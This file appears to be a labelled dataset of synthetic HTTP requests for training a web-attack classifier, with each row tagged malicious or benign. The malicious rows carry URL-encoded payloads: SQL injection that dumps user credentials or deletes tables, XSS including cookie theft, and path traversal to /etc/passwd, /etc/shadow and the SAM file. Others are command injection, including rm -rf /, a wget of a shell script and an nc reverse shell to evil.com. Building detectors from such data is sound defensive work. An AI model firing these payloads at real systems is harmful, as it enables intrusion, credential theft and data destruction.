POST /help/faq city=123%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20email%40example.com&age=please+find+attached&columns=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/search?last_name=641&content=590 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /css/style.css?last_name=my+address+is&quantity=I%20%26%20whoami%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/v1/data?product_id=857 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/products price_min=950&old_password=281&first_name=....//....//....//etc/passwd&comment=130&id=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /register product_id=875&session=please+find+attached&status=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /users/456 page=admin%27%23 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /register?quantity=433&region=I%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20entry&search_term=352 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /about?search=345&tag=508&email=361&old_password=228 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /api/v2/analytics?tag=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&title=686&price_min=test+user&content=system+log+entry&first_name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?last_name=John%20%26%20whoami%20St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/v1/data?tags=please%20%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /settings first_name=%27%20OR%201%3D1-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /register page=362&rating=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/products token=547&last_name=510 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /help/faq filters=786&name=575&comment=826 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /contact sort=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/search?username=605&filter=971&comment=216&page=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/orders?city=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /about?page=best%20%24%28cat%20/etc/shadow%29%20order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/orders?date=please%20%26%20whoami%20regards&status=please+find+attached&tracking=I+would+like+to+order&search_term=system+log+entry&tags=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /register?columns=John+Doe&token=hello%20%3Bcat%24%7BIFS%7D/etc/passwd%20user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/users?columns=468&quantity=test+user&age=367&password=this+is+a+normal+comment&sort=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /dashboard?tracking=966&comment=426&content=777&name=thank+you&filters=568 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /docs/api last_name=best+regards&color=hello%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20you&phone=529&email=820 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /profile tracking=335&rating=7&old_password=hello%20/var/www/../../etc/passwd%20you&sort=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /css/style.css view=479&order_id=system%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /settings type=best%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/products color=this+is+a+normal+comment&tags=276&tag=%27%20OR%201%3D1--&format=528&old_password=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?format=123+Main+St&view=please+find+attached&search_term=system+log+entry&quantity=..%25252f..%25252f..%25252fetc%25252fpasswd&action=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /dashboard date=1000&comment=832&first_name=123+Main+St&content=I%20%3Csvg/onload%3Dalert%281%29%3E%20you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /dashboard?action=test+user&email=56&age=188&date=my%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20email%40example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/users sort=contact+me+at+email@example.com&date=850&content=hello%20%3B%20rm%20-rf%20/%20email%40example.com&price_max=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/v2/analytics?tags=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /posts/789 comment=158&old_password=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css title=%27%20AND%20SLEEP%285%29--&user_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?quantity=663 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /products/123 last_name=my+address+is&date=635&view=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/search?lang=668&columns=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /images/logo.png?tags=test+user&old_password=please+find+attached&city=360&status=915&lang=694 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /js/app.js?city=thank+you&page=538&columns=727&limit=810&last_name=hello%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/users?quantity=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&age=42 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /products/123?columns=%3Bcat%24%7BIFS%7D/etc/passwd&title=contact+me+at+email@example.com&search=59&new_password=984 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /contact?tags=contact+me+at+email@example.com&order=this+is+a+normal+comment&action=admin%20%27%3B%20SELECT%20pg_sleep%285%29--%20user&tracking=123+Main+St&rating=565 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?price_min=297&city=987&price_max=647&columns=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/products?sort=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /profile?tracking=702&password=this+is+a+normal+comment&id=my%20admin%27/%2A%20entry&format=873&last_name=776 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /login token=123%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20is&product_id=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/users author=John+Doe&tracking=886&password=test+user&age=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /docs/api rating=940&color=contact%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20world&price_max=John+Doe&q=I+would+like+to+order&last_name=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics author=my+address+is&phone=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /register?phone=288&email=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/reports comment=thank+you&search_term=please+find+attached&price_max=738&username=I+would+like+to+order&category=%7Cc%27a%27t%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/search?old_password=123%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20email%40example.com&color=45&id=639 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/users sort=my+address+is&date=%27%20AND%201%3D1--&format=439&filters=thank+you&tracking=126 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /js/app.js?tag=best+regards&phone=110&new_password=best+regards&order_id=admin+access+request&q=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/v2/analytics session=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?order_id=best+regards&rating=%26%20nc%20-e%20/bin/bash%20evil.com%204444&status=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /docs/api?q=thank+you&author=693&comment=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /docs/api?page=493&password=123+Main+St&status=423 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /js/app.js?token=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&rating=71&age=402 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api view=940&password=I+would+like+to+order&date=contact+me+at+email@example.com&type=803&search_term=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /docs/api?old_password=my+address+is&search_term=123+Main+St&price_max=508 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /posts/789?user_id=my+address+is&filter=901&color=admin+access+request&action=please+find+attached&quantity=John%20file%3A///etc/passwd%20St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /docs/api?order_id=864&filters=378&order=system+log+entry&email=best+regards&lang=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /settings?author=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/products?q=788&tag=632&age=best+regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /contact first_name=694&search_term=45&format=contact+me+at+email@example.com&quantity=69&password=best%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/reports order_id=672&email=738&price_max=768 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/orders?title=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&new_password=547&filters=14 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /settings phone=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&price_max=best+regards&price_min=605&comment=95 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /products/123 user_id=419&tags=this+is+a+normal+comment&search=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /dashboard?user_id=John+Doe&view=620&search=448&sort=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /profile?action=193&title=890&q=965&tracking=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /posts/789?region=this+is+a+normal+comment&city=416&user_id=system+log+entry&view=%27%20AND%20%27x%27%3D%27y User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /contact tags=838&content=643&order=admin%27/%2A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /users/456?search_term=system%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /login?id=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /docs/api sort=please+find+attached&date=741 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/v1/data?author=admin+access+request&title=contact%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?author=this+is+a+normal+comment&price_min=my%20admin%27%20OR%20%271%27%3D%271%20regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login date=701&q=please+find+attached&quantity=John%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20regards&id=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /login username=John+Doe&email=185&lang=John+Doe&limit=my+address+is&password=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /docs/api?token=429&tag=I+would+like+to+order&date=system%20%3Csvg%20onload%3Dalert%281%29%3E%20entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /settings sort=thank+you&new_password=my+address+is&quantity=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /dashboard?user_id=1%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?q=this+is+a+normal+comment&password=file%3A///etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard price_max=733&order_id=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--&q=42 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users new_password=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&product_id=821&region=6 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?filter=contact+me+at+email@example.com&format=admin%27/%2A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?user_id=793&username=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&region=test+user&order_id=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/products new_password=this+is+a+normal+comment&filters=766&format=374 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?tags=789&token=please+find+attached&sort=best%20%3B%20ls%20-la%20Doe&limit=I+would+like+to+order&price_min=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v2/analytics password=best%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /register?sort=thank+you&limit=707&category=thank%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20world&product_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /help/faq?filter=test+user&new_password=John+Doe&order_id=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /products/123?new_password=thank+you&user_id=please%20/var/www/../../etc/passwd%20order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /dashboard?author=please+find+attached&product_id=624&user_id=please+find+attached&q=admin%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20St&color=876 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /profile?first_name=589&username=84&limit=278&color=thank+you&action=123%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /docs/api title=123+Main+St&filter=my+address+is&search=thank+you&tracking=%3B%20wget%20http%3A//evil.com/shell.sh&action=833 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/v1/data?price_min=%3B%20wget%20http%3A//evil.com/shell.sh&username=John+Doe&name=846 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /posts/789 price_max=thank+you&price_min=686&tracking=thank%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20order&filters=742 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /css/style.css?phone=575&comment=878&color=123+Main+St&region=674&filter=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v2/analytics?token=468&tags=this+is+a+normal+comment&region=828&name=980&author=best%20%27%20OR%20%271%27%3D%271%27--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?comment=John+Doe&title=422&order_id=admin+access+request&color=my+address+is&phone=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /profile?email=345&columns=895&page=best+regards&action=contact%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/orders?status=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--&search=my+address+is&tracking=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /contact?rating=683 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/reports filters=492&last_name=236&email=123%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /about region=925&name=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&city=123+Main+St&limit=252&old_password=219 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings filter=test+user&price_max=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&content=697 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /login price_max=please+find+attached&new_password=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /contact name=my+address+is&action=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&format=please+find+attached&last_name=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /profile region=101 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v1/data?new_password=123+Main+St&quantity=939&email=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v1/data action=123+Main+St&phone=my+address+is&content=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--&order=813 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /settings?filters=best+regards&order_id=please+find+attached&tracking=I%20%27%20AND%20%27x%27%3D%27x%20Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /register?first_name=737&action=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v1/data session=thank%20%24%28cat%20/etc/shadow%29%20order&author=this+is+a+normal+comment&tracking=299&first_name=165&content=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/v1/data?comment=test+user&view=252&filters=967&user_id=563 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/search?search=307&action=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /login?sort=965&limit=832&tag=202&tracking=669&action=%60id%60 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /help/faq?comment=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /dashboard color=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /css/style.css page=John%20%7Cc%27a%27t%20/etc/passwd%20attached&first_name=contact+me+at+email@example.com&rating=admin+access+request&status=826 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/orders?region=I%20%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--%20order&view=234 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /profile?comment=I%20%3Csvg%20onload%3Dalert%281%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /help/faq order_id=I+would+like+to+order&product_id=best+regards&filters=../../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/products age=my+address+is&content=../../../etc/passwd&color=123+Main+St&search=549 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/products?rating=this%20%27%3B%20SELECT%20pg_sleep%285%29--%20you&filters=contact+me+at+email@example.com&category=787 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /js/app.js age=John+Doe&author=692&tags=960 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /about?id=67&view=117&age=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /css/style.css city=hello+world&search_term=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&date=123+Main+St&filter=this+is+a+normal+comment&new_password=385 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /users/456?search=I+would+like+to+order&comment=%26%20nc%20-e%20/bin/bash%20evil.com%204444&old_password=691&lang=my+address+is&limit=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/users?search=best+regards&q=admin%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /posts/789 id=test+user&name=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&sort=676 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /contact?category=John+Doe&view=848&session=114&order_id=989&filters=394 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /help/faq?city=378&first_name=test+user&type=884 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /contact price_max=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20request&session=admin+access+request&first_name=762&view=706 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /docs/api?title=123+Main+St&session=%3B%20wget%20http%3A//evil.com/shell.sh User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /css/style.css?password=contact%20..%25252f..%25252f..%25252fetc%25252fpasswd%20regards&q=123+Main+St&filter=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v2/analytics?username=this+is+a+normal+comment&new_password=%27%20AND%201%3D1--&price_max=my+address+is&content=453&status=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/orders?action=best+regards&region=%24%28cat%20/etc/shadow%29&order=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard lang=John+Doe&tracking=54&first_name=please+find+attached&action=contact+me+at+email@example.com&order_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/v1/data?user_id=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--&columns=242&old_password=654 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/reports sort=system+log+entry&password=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /dashboard category=523&token=123+Main+St&price_max=system+log+entry&password=test%20file%3A///etc/passwd%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/orders format=system+log+entry&order=101&lang=test%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20you&product_id=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /about comment=452&price_min=62 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?limit=339&view=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /contact?filter=please+find+attached&region=686&age=I+would+like+to+order&tag=962&author=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /api/products?city=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&type=704&tracking=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /profile quantity=171&email=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v1/data phone=please%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
